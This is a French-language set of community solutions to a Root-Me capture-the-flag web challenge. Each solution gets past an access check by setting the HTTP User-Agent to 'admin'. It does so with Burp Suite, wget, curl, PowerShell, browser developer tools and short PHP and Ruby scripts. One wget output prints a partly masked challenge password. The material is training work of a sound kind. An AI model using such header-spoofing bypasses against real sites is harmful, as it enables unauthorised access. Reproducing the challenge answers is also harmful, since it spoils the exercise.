Bon, les autres solutions sont beaucoup plus élégantes que la mienne, mais comme elle n’est pas citée la voici :

J’ai utilisé Burp Suite pour modifier le user agent et le mettre à admin.
Ca se fait dans Proxy -> Options -> Match and replace

ou

On voit bien qu’il faut changer le User-Agent, après quelques tests avec wget, on trouve cela avec le useragent "admin" :

wget -U 'admin' -O - http://challenge01.root-me.org//web-serveur/ch2/ 2>/dev/null
<html><body><iframe style="width: 100%; height: 45px; margin: 0; padding: 0;" src="http://www.root-me.org/spip.php?page=externe_header" scrolling="no" frameborder="0"></iframe><h3>Welcome master !
Password : rr$[...]Ae27</h3></body></html>

ou

On peut également changer l’user agent avec Curl. On teste avec admin, et ça passe !

# curl -v —header "User-Agent : admin" -X GET http://challenge01.root-me.org/web-serveur/ch2/

ou

Pour ce challenge, j’ai téléchargé le module ’tamper data’ pour firefox :
https://addons.mozilla.org/fr/firef...

Une fois installé, il suffit de se rendre sur la page du challenge, ouvrir tamper data et cliquer sur ’altérer les données’.
Enfin, il faut changer l’user agent (mozilla pour ma part) en "admin".
On envoie et voila, le flag apparait.

ou

Avec Firefox :
Dans
about:config
, créer une chaine de caractères
general.useragent.override
et y placer
admin

ou

Pour ma part j’ai utilisé l’extension User-Agent Switcher pour Chrome puis j’ai créé un user agent avec pour seule string "admin".

ou

Sous Windows.
Lancer CMD puis saisir "powershell" pour basculer en Powershell.

Saisir :

$req = Invoke-WebRequest -UserAgent 'admin' http://challenge01.root-me.org/web-serveur/ch2/

Invoke-WebRequest est un équivalent du curl sous shell linux

Afficher l’intégralité des éléments de la réponse obtenue par la requête :

PS C:\> $req.AllElements

Vous y verrez le mot magique.

ou

Sous Google Chrome / Chromium :

- CTRL + Shift + i pour ouvrir les Developer Tools
- Cliquer sur le petit "smartphone" en haut à gauche
- apparaisent alors deux groupes d’options haut dessus de la page
- dans UA override : introduire "admin"

ou

Un petit script en php en utilisant cURL, qui possède l’option CURLOPT_USERAGENT qui permet de spécifier un user agent.

    <?php
    $userAgent  = 'admin';
    $curl = curl_init("http://challenge01.root-me.org/web-serveur/ch2/");
    curl_setopt($curl, CURLOPT_USERAGENT, $userAgent);
    $return = curl_exec($curl)."\n";
     
    echo $return;
     ?>

ou

Avec Internet Explorer 11, sur la page du challenge :
- touche F12 (outils de développement)
- onglet Emulation
- Chaine de l’agent : Personnalisé
- Chaine personnalisée : admin

ou

Dans chrome :

click droit > inspect element > emulation (tout en bas) > network > dans la liste des user-agent il faut choisir "others" et écrire "admin".

ou

On peut développer un petit script ruby pour mettre le user-agent que l’on souhaite
Il suffit d’avoir les gem Nokogiri et Mechanize :

    require 'nokogiri'                 #pour récupérer le contenu HTML
    require 'mechanize'            # pour définir le User-Agent
    require 'open-uri'                #pour récupérer la page
     
    agent=Mechanize.new     # création de l'user-agent
    agent.user_agent="admin"          #On choisit le nom qu'on veut
    page = agent.get('http://challenge01.root-me.org/web-serveur/ch2/')            #on récupère la page
    html  =Nokogiri::HTML(page.body)          #on récupère le corps de la page
    puts html          #on l'afiche sur la sortie standard
